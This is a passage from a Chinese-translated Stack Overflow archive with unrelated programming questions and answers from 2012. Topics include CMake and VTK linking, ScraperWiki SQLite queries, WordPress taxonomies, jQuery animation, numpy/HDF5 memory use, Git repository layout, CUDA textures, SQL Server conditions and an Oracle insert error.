FIND_PACKAGE(VTK REQUIRED)
PROJECT(test CXX) 
```

那真的什么都做不了。VTK 包正确地在`/usr/lib/vtk-5.8/VTKConfig.cmake`. 该文件包含许多类型的语句

```
ADD_LIBRARY(foobar SHARED IMPORTED) 
```

表示共享库`libfoobar.so`需要在可执行文件中链接。

但是，在使用上述脚本创建 Makefile 时，CMake 会抱怨

```
CMake Warning (dev) at /usr/lib/vtk-5.8/VTKTargets.cmake:244 (ADD_LIBRARY):
  ADD_LIBRARY called with SHARED option but the target platform does not
  support dynamic linking.  Building a STATIC library instead.  This may lead
  to problems.
Call Stack (most recent call first):
  /usr/lib/vtk-5.8/VTKConfig.cmake:200 (INCLUDE)
  /usr/share/cmake-2.8/Modules/FindVTK.cmake:73 (FIND_PACKAGE)
  CMakeLists.txt:4 (FIND_PACKAGE)
This warning is for project developers.  Use -Wno-dev to suppress it 
```

这个警告是什么意思，如何处理？

这是一个带有 CMake 2.8.9 的 Linux 系统。虽然对于包含 的所有软件包都会出现此错误消息，但`ADD_LIBRARY(foobar SHARED IMPORTED)`此处使用 VTK-5.8 作为示例。

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2014-09-15T09:02:50.657

PROJECT 设置了有关平台的一些重要变量。

在将名称设置为 PROJECT 之前不要调用 FIND_* 模块。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-09-04T14:56:00.867

当 CMake 全局属性**TARGET_SUPPORTS_SHARED_LIBS**设置为 false 并且您使用共享库时，会出现此错误消息。请参阅`Source/cmAddLibraryCommand.cxx`CMake 源代码中的第 100 行。

除非您为非常基本的系统（嵌入式操作系统）进行交叉编译，否则这通常不会发生。

我怀疑这是最新版本的 CMake 中的错误，或者您没有正确配置 CMake。

# javascript - sqlite 查询返回错误 - 无法找出原因

> ID：12264303
> 
> 赞同：1
> 
> 时间：2012-09-04T13:15:55.017
> 
> 标签：javascript, jquery, scraperwiki

不确定这是 sqlite 中自定义函数的副作用，但我试图使用查询来支持表单。（这是一个粗略的演示[http://www.thisistaffordshire.co.uk/images/localpeople/ugc-images/275796/binaries/GPformMap4.html](http://www.thisisstaffordshire.co.uk/images/localpeople/ugc-images/275796/binaries/GPformMap4.html)）

一个小问题是，如果我使用使用某些术语的查询，查询会返回数据：

[https://api.scraperwiki.com/api/1.0/datastore/sqlite?format=htmltable&name=geoutil&apikey=a083014f-1103-47ee-86aa-e30db4aa4762&query=select%20distance(Latitude%2C%20Longitude%2C%2052.951458%2C% 20-2.032748)%20as%20distance%2C%20*%20from%20%60swdata%60%20where%20electronic_prescription%20%3D%20%22Yes%22%20and%20early_appointments%20like%20%22%258%25% 22%20order%20by%20distance%20asc%20limit%2010](https://api.scraperwiki.com/api/1.0/datastore/sqlite?format=htmltable&name=geoutil&apikey=a083014f-1103-47ee-86aa-e30db4aa4762&query=select%20distance%28Latitude,%20Longitude,%2052.951458,%20-2.032748%29%20as%20distance,%20%2a%20from%20%60swdata%60%20where%20electronic_prescription%20=%20%22Yes%22%20and%20early_appointments%20like%20%22%258%25%22%20order%20by%20distance%20asc%20limit%2010)

但其他不包括electronic_prescription 标签的人不这样做并返回以下错误：

{u'error': u'sqliteexecute: sqlite3.Error: 用户定义函数引发异常'}

[https://api.scraperwiki.com/api/1.0/datastore/sqlite?format=htmltable&name=geoutil&apikey=a083014f-1103-47ee-86aa-e30db4aa4762&query=select%20distance%28Latitude%2C%20Longitude%2C%2052.951458%2C% 20-2.032748%29%20as%20distance%2C%20*%20from%20%60swdata%60%20where%20early_appointments%20like%20%22%258%25%22%20order%20by%20distance%20asc%20limit%2010](https://api.scraperwiki.com/api/1.0/datastore/sqlite?format=htmltable&name=geoutil&apikey=a083014f-1103-47ee-86aa-e30db4aa4762&query=select%20distance%28Latitude,%20Longitude,%2052.951458,%20-2.032748%29%20as%20distance,%20%2a%20from%20%60swdata%60%20where%20early_appointments%20like%20%22%258%25%22%20order%20by%20distance%20asc%20limit%2010)

我认为问题归结为使用自定义函数返回基于两个纬度/经度定义点的距离的错误。

我做错了什么？更重要的是，它容易修复吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-05T10:41:02.083

David Jones 在 ScraperWiki 电子邮件列表中回答了这个问题。你可以在这里阅读答案：

[https://groups.google.com/forum/?fromgroups=#!topic/scraperwiki/Rh6qkNHiRjI](https://groups.google.com/forum/?fromgroups=#!topic/scraperwiki/Rh6qkNHiRjI)

# php - 具有分层 url 链接结构的自定义分类法

> ID：12264305
> 
> 赞同：1
> 
> 时间：2012-09-04T13:16:00.087
> 
> 标签：php, wordpress

我创建了一个名为 instrument_categories 的自定义分类法。它工作正常，但我希望链接结构是这样的：

```
www.example.com/instruments/term/subterm 
```

相反，我得到了这个：

```
www.example.com/instruments/term/
www.example.com/instruments/subterm 
```

我已经阅读了十几篇关于此的帖子，但我的代码没有发现任何问题：

```
 add_action( 'init', 'create_instrument_taxonomies', 0 );

 function create_instrument_taxonomies()
 {
   // Add new taxonomy, make it hierarchical (like categories)
   $labels = array(
     'name' => _x( 'Instrument Categories', 'taxonomy general name' ),
     'singular_name' => _x( 'Instrument Category', 'taxonomy singular name' ),
     'search_items' =>  __( 'Search Instrument Categories' ),
     'popular_items' => __( 'Popular Instrument Categories' ),
     'all_items' => __( 'All Instrument Categories' ),
     'parent_item' => __( 'Parent Instrument Category' ),
     'parent_item_colon' => __( 'Parent Instrument Category:' ),
     'edit_item' => __( 'Edit Instrument Category' ),
     'update_item' => __( 'Update Instrument Category' ),
     'add_new_item' => __( 'Add New Instrument Category' ),
     'new_item_name' => __( 'New Instrument Category Name' ),
   );
       register_taxonomy('instrument_categories',array('sdp_instrument'), array(
         'hierarchical' => true,
         'labels' => $labels,
         'show_ui' => true,
         'query_var' => true,
         'rewrite' => array( 'slug' => 'instruments', 'hierarchal' => true, 'with_front' => true ),
       ));
 } 
```

我错过了什么吗？我确保刷新了永久链接。为什么这行不通？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-09-06T13:39:07.823

你真的做错了。

您需要知道的一切都在这里：[http ://thereforei.am/2011/10/28/advanced-taxonomy-queries-with-pretty-urls/](http://thereforei.am/2011/10/28/advanced-taxonomy-queries-with-pretty-urls/)

# jquery - 一个div的jQuery滚动背景图片

> ID：12264307
> 
> 赞同：1
> 
> 时间：2012-09-04T13:16:01.667
> 
> 标签：jquery, scroll, background-image

我想简单地将背景图像在 div 中向下移动（小于图像），以便图像在 div 的可见区域中漂移（图像高 705，div 高 215px）。

我从其他帖子中得到了这个，但它似乎不起作用:(

有任何想法吗？- 没有错误，但什么也没发生

在 HTML 我有

```
<div id="banner"></div> 
```

和CSS；

```
#banner {
    background-image: url(/media/residential-services-705.jpg);
    background-repeat: no-repeat;
    height: 215px;
    width: 940px;
    background-position: left 0px;
    margin: 0px;
    padding: 0px;
} 
```

和 javascript

```
$(document).ready(function () {
    bouncebanner();
});

function bouncebanner(){
    $('#banner').stop().animate(
        {backgroundPosition:"(0 -490px)"}, 
        {duration:5000}
    );
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:19:49.497

```
backgroundPosition: '0 -490' 
```

不要使用可能导致问题的 px 和括号

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:33:05.733

如果您只想为其中一个轴（X 或 Y）设置动画，则应按如下方式定位该特定轴：

```
// X Axis, use backgroundPositionX //
function bouncebanner(){
    $('#banner').stop().animate({backgroundPositionX: -490}, 5000);
}

// Y Axis, use backgroundPositionY //
function bouncebanner(){
    $('#banner').stop().animate({backgroundPositionY: -490}, 5000);
} 
```

此外，请考虑为背景图像添加起始位置，因为这将防止图像在旧浏览器中跳转，如下所示：

```
background: url(/media/residential-services-705.jpg) no-repeat 0 0; 
```

[X 轴的 JSFiddle](http://jsfiddle.net/Btfsg/1/)

[Y 轴的 JSFiddle](http://jsfiddle.net/Btfsg/)

我希望这有帮助！

# python - 大型 numpy (HDF5) 数组的统计信息

> ID：12264309
> 
> 赞同：4
> 
> 时间：2012-09-04T13:16:06.460
> 
> 标签：python, numpy, python-2.7, h5py

我有相当大的 4D 数组 [20x20x40x15000]，我使用[h5py](http://code.google.com/p/h5py/)作为 HDF5 文件保存到磁盘。现在的问题是我想计算整个数组的平均值，即使用：

```
numpy.average(HDF5_file) 
```

我得到一个`MemoryError`. 似乎 numpy 试图将 HDF5 文件加载到内存中以执行平均？

有没有人对这个问题有一个优雅而有效的解决方案？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-04T13:36:28.043

折叠 240 000 000 个值需要几行代码才能有效工作。Numpy 通过将所有数据加载到内存中来工作，因此您将无法像您发现的那样天真地加载数据。您必须将问题分成几块，并使用 map/reduce 方法：

*   选择一个块大小（根据内存限制）
*   将数据分成这个大小的块（通过创建多个文件，或者一次只加载一个块）
*   对于每个块，计算平均值并卸载数据
*   将平均值合并到您的最终结果中。

您可以将[from_buffer](http://docs.scipy.org/doc/numpy/reference/generated/numpy.frombuffer.html)与 count 和 offset 参数一起使用来加载部分数据。

**编辑**

您可以尝试使用 python 分析器来检查相对成本是多少。

如果主要成本是处理，您可以尝试使用多进程库中的进程池或 numpy 的并行版本将其并行化。或者使用 GPGPU 库，例如 pyopencl。

如果处理时间等于加载时间，您可以尝试使用多处理库对这两个任务进行流水线处理。创建一个线程来加载数据并将其提供给处理线程。

如果主要成本是加载时间，那么问题就更大了。您可以尝试在不同的计算机上划分任务（使用网格库来管理数据复制和任务分发）。

# php - 无法使用 OpenInviter 导入联系人

> ID：12264316
> 
> 赞同：1
> 
> 时间：2012-09-04T13:16:24.213
> 
> 标签：php, javascript, html

我想将 OpenInviter 用于我的一个项目，我已按照安装步骤操作，效果很好，我还从目录中删除了“postinstall.php”。

现在，当我尝试从任何电子邮件提供商获取联系人时，它会生成错误“登录无效。请检查您提供的电子邮件和密码，稍后再试！”。

我也试过现场可用的演示，但它只从 GMail 获取联系人。您能否帮助我解决错误或引导我访问任何链接。等待回复。提前致谢

# opengl-es-2.0 - 使用顶点着色器将纹理移动到像素中心

> ID：12264318
> 
> 赞同：0
> 
> 时间：2012-09-04T13:16:28.100
> 
> 标签：opengl-es-2.0, vertex-shader

我正在尝试将我的纹理移动到像素的中心，如此处所述[OpenGL Texture Coordinates in Pixel Space](https://stackoverflow.com/questions/5879403/opengl-texture-coordinates-in-pixel-space/5879551#5879551)但我正在努力这样做。我们试图以纹理为中心的像素还是在屏幕上？我们如何访问它们？这是我的顶点着色器：

```
"uniform mat4 " + ShaderProgramConstants.UNIFORM_MODELVIEWPROJECTIONMATRIX + ";\n" +
"attribute vec4 " + ShaderProgramConstants.ATTRIBUTE_POSITION + ";\n" +
"attribute vec4 " + ShaderProgramConstants.ATTRIBUTE_COLOR + ";\n" +
"attribute vec2 " + ShaderProgramConstants.ATTRIBUTE_TEXTURECOORDINATES + ";\n" +
"varying vec4 " + ShaderProgramConstants.VARYING_COLOR + ";\n" +
"varying vec2 " + ShaderProgramConstants.VARYING_TEXTURECOORDINATES + ";\n" +

"void main() {\n" +
"   " + ShaderProgramConstants.VARYING_COLOR + " = " + ShaderProgramConstants.ATTRIBUTE_COLOR + ";\n" +
"   " + ShaderProgramConstants.VARYING_TEXTURECOORDINATES + " = " + ShaderProgramConstants.ATTRIBUTE_TEXTURECOORDINATES + ";\n" +
    "   gl_Position = " + ShaderProgramConstants.UNIFORM_MODELVIEWPROJECTIONMATRIX + " * " + ShaderProgramConstants.ATTRIBUTE_POSITION + ";\n" +
"}" 
```

我是开放 GL 的新手，刚刚开始研究顶点着色器，所以任何建议或提示将不胜感激。

编辑：我遇到的问题是，我的纹理中的像素在缩放时会变形。普通纹理看起来不错，但是当它们在 4x4 矩阵（模型视图矩阵）上使用 scaleM 命令缩放时，看起来随机行和列中有两列或两行相同的像素。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T22:27:21.047

原来是比例因子导致了失真。我所要做的就是确保纹理中的每个像素在显示器上具有相同数量的像素，并且失真消失了。

# php - FuelPHP SimpleAuth登录在IE中不起作用

> ID：12264322
> 
> 赞同：0
> 
> 时间：2012-09-04T13:16:47.027
> 
> 标签：php, internet-explorer, authentication, fuelphp

我在使用 FuelPHP 的 SimpleAuth 登录时遇到了明显的 IE 问题。它在本地主机上运行良好，但在我正在处理的站点的暂存版本上，`Auth::check()`登录后总是失败。

如果我转储`Auth::check()`登录表单验证时的内容，我会得到`true`，表明用户已成功登录。但是，在我将用户重定向到下一页（使用`Response::redirect`）后，再次`Auth::check()`评估为`false`。我认为问题与重定向没有直接关系，因为即使我不重定向用户，登录仍然失败。

由于某种原因，这个问题似乎只发生在 IE（8 和 9）中。在 Opera、Firefox 等中，用户登录和注销工作正常。正如我之前所说，它也适用于我本地开发版本的 IE。我只能认为它一定是一些cookie或会话处理问题，但我不知道问题是什么。如果有人能对此有所了解，我将不胜感激！

我正在使用 FuelPHP 1.1 版

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-04T16:21:53.450

我整天都在堆积同一个问题，最后，我解决了它。

就我而言，问题出在 Safari / Mac 上，每次登录后会话都被终止。事实上，这是因为我使用 ajax 调用（在服务器上具有相对路径）来登录我的用户，显然是 ajax call 发送与 http 调用不同的用户代理，并且不匹配导致 Fuel 终止会话。

我使用的解决方案是禁用`match_ua`会话配置中的值。为了使事情更安全，我`match_ip`改为启用。我不知道这是否是一个好的解决方案。

我仍然不知道为什么用户代理会有所不同。如果有人能让我更清楚地了解这个问题，非常感谢。

# javascript - 创建类似于 Google Analytics 的分析图

> ID：12264326
> 
> 赞同：4
> 
> 时间：2012-09-04T13:17:05.827
> 
> 标签：javascript, jquery, google-maps, jquery-plugins

我在工作中在这里建立一个管理面板，并记录下载我们的 iTunes mp3 的用户的一些 ip 数据。我们有用户的 ip 和位置，但我想要一些直观地显示它的方式。是否有任何 jquery 插件或插件可以让我在类似于 Google Analytics 的方式的地图上直观地显示我收集的统计数据？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-04T13:32:51.963

您是否尝试过 Google Chart Tools api ( [https://developers.google.com/chart/](https://developers.google.com/chart/) )？

有一个地理图表，我认为这正是您所说的。 [https://google-developers.appspot.com/chart/interactive/docs/gallery/geochart](https://google-developers.appspot.com/chart/interactive/docs/gallery/geochart) [https://code.google.com/apis/ajax/playground/?type=visualization#geo_chart](https://code.google.com/apis/ajax/playground/?type=visualization#geo_chart)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-02T13:34:45.730

[jVectorMap](http://jvectormap.com)也可能适合这里。

# git - 多个自定义项目和 Git 的最佳实践

> ID：12264329
> 
> 赞同：6
> 
> 时间：2012-09-04T13:17:24.470
> 
> 标签：git, version-control, remote-branch

在我的公司，我们有一个为每个客户定制的基础软件。今天使用 SVN，我们有这样的设置：

```
/trunk
/tags
    …
/branches
    /client_project_x
    /client_project_y
    /client_project_z 
```

在 git 中组织这个最好的方法是什么？每个项目都有一个远程存储库和一个用于基本代码的远程存储库，还是有一个带有多个分支的大型远程存储库？

如果我们使用带有多个分支的大型远程仓库，有没有办法从远程仓库克隆一个分支？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:53:43.317

从概念上讲，一个存储库中的多个分支与多个存储库中的分支之间没有区别。DVCS 的全部意义在于消除这种区别。您想根据需要访问和控制任何给定分支的*人员来考虑它。*如果每个开发人员都可以访问每个客户端的代码，那么将它们全部放在一个中央存储库中会更容易。您可以选择要克隆或不克隆的分支，尽管克隆整个 repo 是最简单的。如果您需要在不同的分支中拥有非常不同的访问权限，最好为它们创建单独的存储库。

换句话说，以任何一种方式设置它都可以让开发和测试团队更容易。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:25:08.123

单独的项目应该在单独的存储库中。

（就像使用 git 一样简单。将大量不相关或松散相关的项目保存在单个存储库中，无论是在大树中还是在单独的分支中，都没有优势，也有很多潜在的劣势。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:25:37.420

git 的诞生是为了让分支/合并分支变得如此简单，所以只需根据需要创建分支以获取新功能、测试功能、与子团队合作，而不会影响公司的其他部门！例如，Linux 有数千个分支，而且还在不断增长！

观看Linus Torvalds 的[这个视频](http://www.youtube.com/watch?v=4XpnKHJAok8)，这将帮助您了解他在开发 git 时所拥有的“头脑”价值观。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-04T14:07:12.773

我使用了几个回购：

核心在一个存储库中，每个插件和每个客户端都有自己的存储库：

*   模组（核心）
*   modwork_foo（客户端“foo”的配置）
*   modwork_app1（可以为多个客户端安装的应用程序）

在安装或构建过程中不会修改核心中的单个文件。每个客户都有相同的核心。核心包含自定义方法的钩子。

我不喜欢为客户修改分支的核心文件。我认为如果您有超过 5 个客户，这会变得很困难。

# android - Android 数据使用监听器

> ID：12264332
> 
> 赞同：0
> 
> 时间：2012-09-04T13:17:26.257
> 
> 标签：android

我正在开发一个向服务器发送一些数据的应用程序。我不希望我的应用程序干扰其他应用程序的数据传输。我想在开始传输之前收听上行链路状态并检查其是否空闲。我查看了 TrafficStats、ConnectivityManager 和 NetworkInfo 类，但只能找到数据使用量。有没有我可以注册的监听器，以获取当前的上行链路或下行链路统计信息？任何帮助，将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:44:33.133

> 我想在开始传输之前收听上行链路状态并检查其是否空闲。

这里没有真正的“免费”概念。您可以使用它`TrafficStats`来测量一段时间内的带宽消耗，以查看其他应用程序目前是否在做很多事情。

> 有没有我可以注册的监听器，以获取当前的上行链路或下行链路统计信息？

不。

# cuda - 无法从纹理内存中读出值

> ID：12264336
> 
> 赞同：0
> 
> 时间：2012-09-04T13:17:37.997
> 
> 标签：cuda, textures, gpu

嗨，我正在编写一个简单的程序来练习使用纹理内存。我只想将我的数据写入纹理内存并将其写回全局内存。但我无法读出价值观。这是代码。

```
#include <stdio.h>
#include <iostream>
#include "cuda.h"
#include <stdlib.h>
#include "cuda_runtime.h"
#include "device_launch_parameters.h"
#include "HelloWorld.h"

#include "linearInterpolation_kernel4.cu"

using namespace std;
using std::cout;

const int blocksize = 16; 

__global__ 
void hello(char *a, int *b) {
    a[threadIdx.x] += b[threadIdx.x];
}

////////////////////////////////////////////////////////////////////////////////
// These are CUDA Helper functions

// This will output the proper CUDA error strings in the event that a CUDA host call returns an error
#define checkCudaErrors(err)           __checkCudaErrors (err, __FILE__, __LINE__)

inline void __checkCudaErrors( cudaError err, const char *file, const int line )
{
    if( cudaSuccess != err) {
        printf("%s(%i) : CUDA Runtime API error %d: %s.\n",file, line, (int)err, cudaGetErrorString( err ) );

    }
}

// This will output the proper error string when calling cudaGetLastError
#define getLastCudaError(msg)      __getLastCudaError (msg, __FILE__, __LINE__)

inline void __getLastCudaError( const char *errorMessage, const char *file, const int line )
{
    cudaError_t err = cudaGetLastError();
    if( cudaSuccess != err) {
        printf("%s(%i) : getLastCudaError() CUDA error : %s : (%d) %s.\n", file, line, errorMessage, (int)err, cudaGetErrorString( err ) );

    }
}

int main()
{
    int N = 40; 
    float *A; 
    A = (float *) malloc(N*sizeof(float));
    float *B;
    B = (float *) malloc(N*sizeof(float));
    float *result;
    result = (float *) malloc(N*sizeof(float));
    float angle = 0.8f; 

    for(int i = 0; i < N; i++){
        A[i] = i; //(float)rand();
        B[i] = i+1; //(float)rand();
    }
    ipLinearTexture2(A,B,result,angle,N);

    float result2;

    result2 = (angle)*A[4] + (1-angle)*B[4]; 

    printf(" A %f B %f Result %f\n", A[4], B[4], result[4]);
    cout << result2 << endl;

    return 1;
}

void ipLinearTexture2(float *A, float* B, float* result, float angle, int N)
{
    float cuTime;

    int N2 = N * 2;
    float *dev_result;

    float **AB;

    AB = (float **) malloc( N * sizeof(float *));

    if(AB)
    {
        for(int i = 0; i < N; i++)
        {
            AB[i] = (float *) malloc( 2 * sizeof(float *));
        }
    }

    for (int i = 0; i < N; i = i++)
    {
        AB[i][0] = A[i];
        AB[i][1] = B[i];
    }

    cudaMalloc(&dev_result, N * sizeof(float));
    unsigned int size = N2 * sizeof(float);

    //cudaChannelFormatDesc channelDesc = cudaCreateChannelDesc(32, 0, 0, 0, cudaChannelFormatKindFloat);
    cudaChannelFormatDesc channelDesc = cudaCreateChannelDesc<float>();
    cudaArray* cu_array;

    checkCudaErrors(cudaMallocArray( &cu_array, &channelDesc,N,2)); 
    cudaMemcpy2DToArray(cu_array,0,0,AB,N * sizeof(float), N * sizeof(float), 2, cudaMemcpyHostToDevice);

    // set texture parameters
    tex2.normalized = true;  
    tex2.filterMode = cudaFilterModeLinear;
    tex2.addressMode[0] = cudaAddressModeWrap; //cudaAddressModeWrap;
    tex2.addressMode[1] = cudaAddressModeWrap; //cudaAddressModeClamp;

    checkCudaErrors(cudaBindTextureToArray( tex2, cu_array, channelDesc));

    dim3 dimBlock(10, 1, 1);
    dim3 dimGrid((int)ceil((double)N*2/dimBlock.x), 1, 1);

    transformKernel4<<< 256, 256, 0 >>>( dev_result, N, 2, angle);

    checkCudaErrors(cudaMemcpy(result, dev_result, N * sizeof(float), cudaMemcpyDeviceToHost));
    cout << "==================================================" << endl;

    for (int i = 0 ; i < N ;i++)
    {
        cout << result[i] << " on " << i << endl;   
    }

    cout << "==================================================" << endl;
    checkCudaErrors(cudaUnbindTexture(tex));
    checkCudaErrors(cudaFree(dev_result));
    checkCudaErrors(cudaFreeArray(cu_array));
} 
```

这是内核代码

```
#ifndef _SIMPLETEXTURE_KERNEL5_H_
#define _SIMPLETEXTURE_KERNEL5_H_

// Texture references

texture<float, 2, cudaReadModeElementType> tex2;

__global__ void
transformKernel4(float* g_odata, int width, int height, float theta) 
{
    unsigned int xid = blockIdx.x * blockDim.x + threadIdx.x;
    unsigned int yid = blockIdx.y * blockDim.y + threadIdx.y;

    if (xid >= width || yid >= height) return; 

    float dx = 1.0f / (float)width;
    float dy = 1.0f / (float)height;

    float x = ((float)xid + 0.5f) * dx;
    float y = ((float)yid + 0.5f) * dy;

        float value = tex2D(tex2, x , y);
        printf("wert %f xid %i yid %i \n",value, xid, yid);
g_odata[yid * width + xid] = value;

    }
#endif // #ifndef _SIMPLETEXTURE_KERNEL_H_ 
```

有人能告诉我我做错了什么吗？我已经对其进行了编辑以删除前 2 个逻辑错误。把为什么我需要能够打印出我的数据？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T08:59:24.790

这是数组的错误绑定。您不能在 C 中使用可复制的多维数组。您必须使用表示多维的一维数组。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-05T07:18:52.403

我可以在这里看到 2 个逻辑错误。

第一个是@asm 指出的。应通过从 2D x 和 y 索引计算线性索引来存储输出。

outputIndex = yid * 宽度 + xid；

第二个是 cudaArray 结构的内存分配是内部对齐的。您应该考虑使用 cudaMemcpy2DToArray 函数来避免错误的数据复制。

`cudaMemcpy2DToArray(cu_array,0,0,AB,N * sizeof(float), N * sizeof(float), 2, cudaMemcpyHostToDevice);`

# sql - 条件 Where 子句：除了动态查询之外还有什么写法？

> ID：12264342
> 
> 赞同：0
> 
> 时间：2012-09-04T13:18:03.283
> 
> 标签：sql, sql-server, sql-server-2008

这是我未编译的查询：

```
Select 1 from dbo.EmailAddresses e
    Inner Join Users u On e.UserID = u.UserID
        Where LOWER(EmailAddress) = @EmailAddress               
        And
    Case When @For = 1 Then e.JurisdictionID IS NOT NULL  When @For = 2 Then e.AccountID IS NOT NULL  End 
```

谁能告诉我在没有动态查询的情况下编写此查询的方法，即在字符串中构建查询？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:20:36.843

这应该有效：

```
Select 1 from dbo.EmailAddresses e
    Inner Join Users u On e.UserID = u.UserID
        Where LOWER(EmailAddress) = @EmailAddress               
        And (
            (@For = 1 AND e.JurisdictionID IS NOT NULL) OR
            (@For = 2 AND e.AccountID IS NOT NULL)
        ) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-04T13:21:23.457

尝试Easy和一种尝试不带案例的方法，当..

```
Select 1 from dbo.EmailAddresses e 

    Inner Join Users u On e.UserID = u.UserID 
        Where LOWER(EmailAddress) = @EmailAddress                        
And  (   (@For = 1 and e.JurisdictionID IS NOT NULL)
        or ( @For = 2 and e.AccountID IS NOT NULL  )) 
```

# cloud-foundry - 在 cloudfoundry 中部署 tomcat 7 时的问题

> ID：12264345
> 
> 赞同：2
> 
> 时间：2012-09-04T13:18:18.343
> 
> 标签：cloud-foundry

我有一个 java Spring 应用程序，我想将它部署到 Tomcat7 上的 Cloudfoundry。我是 Cloudfoundry 的新手，并按照[此处](http://blog.cloudfoundry.org/2012/06/18/deploying-tomcat-7-using-the-standalone-framework/)提到的步骤操作，但是当我发出`vmc push`命令时，我收到警告`Can't determine the Application Type`，但没有提供任何选项。有什么办法解决这个问题吗？

```
C:\apps\tomcat7>vmc push
Would you like to deploy from the current directory? [Yn]:

Application Name: myApp77

[WARNING] Can't determine the Application Type.

Select Application Type: 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-11T09:08:12.977

丹的评论是正确的。您应该可以选择独立应用程序。您可能想查看[https://github.com/ericbottard/cloudfoundry-tomcat-7](https://github.com/ericbottard/cloudfoundry-tomcat-7)，它是您提到的博客文章中描述的已经定制（和测试）的 tomcat 分发。

更好的是，如果您使用的是 Maven，只需按照自述文件进行操作，您就可以将您的 war 项目自动部署为独立的 tomcat7。

希望这可以帮助，

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:36:22.347

这对我来说实际上听起来是正确的，在应用程序类型列表中应该是一个名为“独立应用程序”的条目。选择那个，然后提供您希望启动应用程序的命令，在本例中为“bin/startup.sh”

# iphone - iOS plot 3d 图形库

> ID：12264347
> 
> 赞同：4
> 
> 时间：2012-09-04T13:18:30.213
> 
> 标签：iphone, ios, graph, plot

我正在搜索一个可以帮助我绘制 3D 图形的库。我想要类似于[此页面](http://www.math.uri.edu/~bkaskosz/flashmo/graph3d/)或[GNUPlot](http://www.gnuplot.info/)的内容。我会进行所有计算，我只想要一个可以将我的 (x, y, z) 值打印到 iPhone/iPad 屏幕的库。

在谷歌上搜索，我找到了[core-plot](http://code.google.com/p/core-plot/)，但据我所知它只能打印二维图。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T15:25:47.030

ManiacDev 最近发布了一篇很好的概述，介绍了在 iOS 上绘制 3D 图表的优秀框架：

[http://maniacdev.com/2012/08/open-source-ios-library-for-easily-creating-3d-charts/](http://maniacdev.com/2012/08/open-source-ios-library-for-easily-creating-3d-charts/)

# c# - 如何从作为请求发送到 Web 服务的 SOAP 客户端查看 XML？

> ID：12264357
> 
> 赞同：2
> 
> 时间：2012-09-04T13:19:09.650
> 
> 标签：c#, xml, web-services, soap, client

如何查看从向 Web 服务发送请求的 soap 客户端接收到的 XML？

我尝试使用提琴手查看它，但无法查看 XML。

我应该使用什么工具？

# oracle - 无法使用 Oracle 11g 进行简单插入

> ID：12264358
> 
> 赞同：1
> 
> 时间：2012-09-04T13:19:15.673
> 
> 标签：oracle, oracle11g

我正在尝试将 Sybase 服务器中的表中的数据复制到 Oracle 服务器（Oracle 11g）中的同一个表中。我认为使用我的coldfusion网络编程会更容易，因为有2个不同的数据库服务器。不幸的是，我从 Oracle 收到了以下错误。我不认为我的语法是错误的。因为所有的逗号都在那里，并且没有错误所说的缺少逗号。我认为这可能是由于设置为 DATE 数据类型的 DATE 列。

这是错误：

```
Error Executing Database Query.  
[Macromedia][Oracle JDBC Driver][Oracle]ORA-00917: missing comma 
```

错误发生在`C:\Inetpub\wwwroot\test.cfm: line 65`

```
63 :      #um_gs_dnrcnt_cfm_pp#,                                           
64 :      #um_gs_amt_cfm_pg_pp#,                                            
65 :      #um_gs_dnrcnt_cfm_pg_pp#)
66 :     </cfquery>
67 : </cfoutput>

--------------------------------------------------------------------------------

SQLSTATE   HY000 
SQL    INSERT INTO um_gift_sum (um_gs_fyr, um_gs_inst, um_gs_dept, 
                                um_gs_dt_of_record, um_gs_fund_type, 
                                um_gs_dnr_type,
                                um_gs_amt_cash, um_gs_dnrcnt_cash, um_gs_amt_pl,
                                um_gs_dnrcnt_pl, um_gs_amt_pp, um_gs_dnrcnt_pp,  
                                um_gs_amt_pp_prior, um_gs_dnrcnt_pp_prior, 
                                um_gs_amt_gik, um_gs_dnrcnt_gik, 
                                um_gs_amt_pg_cash, 
                                um_gs_dnrcnt_pg_cash, um_gs_amt_pg_pl, 
                                um_gs_dnrcnt_pg_pl, um_gs_amt_pg_pp, 
                                um_gs_dnrcnt_pg_pp, um_gs_amt_gft_mtch, 
                                um_gs_dnrcnt_gft_mtch, um_gs_amt_cfm_pp, 
                                um_gs_dnrcnt_cfm_pp, um_gs_amt_cfm_pg_pp,  
                                um_gs_dnrcnt_cfm_pg_pp) 
       VALUES('1995', 'AB', 'MAA', 1995-01-31 00:00:00.0, '1', 'FR', 100.0000, 0,
              0.0000, 0, 0.0000, 0, 0.0000, 0, 0.0000, 0, 0.0000, 0, 0.0000, 0, 
              0.0000, 0, 0.0000, 0, 0.0000, 0, 0.0000, 0) 
```

## 这是我的插入语句：

```
<cfquery name="x" datasource="SybaseDB">                   
 SELECT TOP 10 * FROM um_sum                               
</cfquery>                                                 

<cfoutput query="x">                                       

  <cfquery name="Y" datasource="OracleDB">                 
  INSERT INTO um_sum (um_gs_fyr,                           
                 m_gs_inst,                                  
                      um_gs_dept,                          
                      um_gs_dt_of_record,                  
                      um_gs_fund_type,                     
            um_gs_dnr_type,                                     

            etc,                                                 

            um_gs_dnrcnt_cfm_pp,                              
            um_gs_amt_cfm_pg_pp,                              
